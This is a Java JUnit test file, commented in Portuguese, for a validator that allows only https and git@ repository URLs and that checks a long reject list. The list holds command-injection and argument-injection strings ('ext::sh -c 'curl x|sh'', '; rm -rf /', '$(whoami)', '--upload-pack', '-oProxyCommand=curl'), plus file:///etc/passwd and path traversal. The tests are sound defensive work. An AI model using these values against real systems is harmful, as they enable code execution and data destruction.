package br.com.labdesktop.projetos;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import org.junit.jupiter.api.Test;

/** O endereço do repositório: só https e git@, por lista branca, com uma lista de endereços maliciosos recusados. */
class UrlDeGitTest {

    @Test
    void enderecosQueValem() {
        for (String ok : List.of("https://github.com/usuario/repo.git", "https://github.com/usuario/repo", "https://gitlab.com/grupo/sub/projeto.git",
            "https://git.example.com:8443/time/app.git", "git@github.com:usuario/repo.git", "git@gitlab.com:grupo/sub/projeto.git",
            "https://github.com/Usuario-1/Meu_Repo.v2.git", "git@bitbucket.org:time/app")) {
            UrlDeGit.Resultado r = UrlDeGit.conferir(ok);
            assertTrue(r.valida(), ok + " -> " + r.mensagem());
            assertEquals(ok, r.url().texto());
        }
    }

    @Test
    void nomeSugeridoSaiDoRepositorio() {
        assertEquals("repo", UrlDeGit.conferir("https://github.com/usuario/repo.git").url().nomeSugerido());
        assertEquals("meu-repo-v2", UrlDeGit.conferir("https://github.com/Usuario-1/Meu_Repo.v2.git").url().nomeSugerido());
        assertEquals("app", UrlDeGit.conferir("git@bitbucket.org:time/app").url().nomeSugerido());
        assertEquals("projeto", UrlDeGit.conferir("git@gitlab.com:grupo/sub/projeto.git").url().nomeSugerido());
        assertEquals("repo", UrlDeGit.conferir("https://github.com/usuario/repo/").url().nomeDoRepositorio());
    }

    private static void recusa(String ruim) {
        UrlDeGit.Resultado r = UrlDeGit.conferir(ruim);
        assertFalse(r.valida(), "devia recusar: " + ruim.replace("\n", "\\n"));
        assertFalse(r.mensagem().isEmpty(), "sem frase para: " + ruim.replace("\n", "\\n"));
    }

    @Test
    void listaDeEnderecosMaliciosos() {
        List<String> maliciosos = List.of(
            "file:///etc/passwd", "file:/etc/passwd", "FILE:///x", "ext::sh -c 'curl x|sh'", "ext::sh -c touch% /tmp/x", "fd::3/foo",
            "ssh://git@github.com/usuario/repo.git", "git://github.com/usuario/repo.git", "ftp://x/y", "http://github.com/usuario/repo.git",
            "https://github.com/usuario/repo.git; rm -rf /", "https://github.com/usuario/repo.git && ls", "https://github.com/usuario/repo.git | sh",
            "https://github.com/usuario/$(whoami)", "https://github.com/usuario/`id`", "https://github.com/usuario/repo.git\nrm -rf /", "https://github.com/usuario/repo git",
            " https://github.com/usuario/repo.git", "https://github.com/usuario/repo.git ", "https://github.com/usuario/repo.git\t--upload-pack=x",
            "https://user:senha@github.com/usuario/repo.git", "https://token@github.com/usuario/repo.git", "https://ghp_abcdef:x-oauth-basic@github.com/d/r.git",
            "https://github.com/usuario/repo.git?x=1", "https://github.com/usuario/repo.git#ref", "https://github.com/usuario/repo'.git", "https://github.com/usuario/\"repo\".git",
            "https://github.com/../etc/passwd", "https://github.com/usuario/../../x", "https://github.com/usuario/./x", "git@github.com:../x", "git@github.com:usuario/../x",
            "-oProxyCommand=curl", "--upload-pack=touch /tmp/x", "-c", "--", "git@github.com:-x/y", "https://", "https://github.com", "https://github.com:abc/usuario/repo.git",
            "https://[::1]/usuario/repo", "https://example.com/a b", "https://example.com/a<b", "https://example.com/a>b", "https://example.com/a\\b",
            "git@github.com:usuario/repo.git;ls", "git@github.com usuario/repo", "outro@github.com:usuario/repo.git", "git@:usuario/repo", "git@github.com:", "meu-repo", "github.com/usuario/repo",
            "https://github.com/usuario/repo.git\u0000", "https://github.com/usuario/repo.git\r\nHost: x", "https://example.com/ repo", "https://gité.com/x/y",
            "x".repeat(400), "https://github.com/" + "a".repeat(300), "git@github.com:" + "a".repeat(300));
        for (String ruim : maliciosos) {
            recusa(ruim);
        }
    }

    @Test
    void asFrasesDizemOQueFazer() {
        assertTrue(UrlDeGit.conferir("https://u:p@github.com/a/b.git").mensagem().contains("usuário nem senha"));
        assertTrue(UrlDeGit.conferir("http://github.com/a/b.git").mensagem().contains("https://"));
        assertTrue(UrlDeGit.conferir("file:///x").mensagem().contains("não é aceito"));
        assertTrue(UrlDeGit.conferir("a b").mensagem().contains("espaço"));
        assertEquals("", UrlDeGit.conferir("").mensagem());
        assertEquals("", UrlDeGit.conferir(null).mensagem());
    }
}
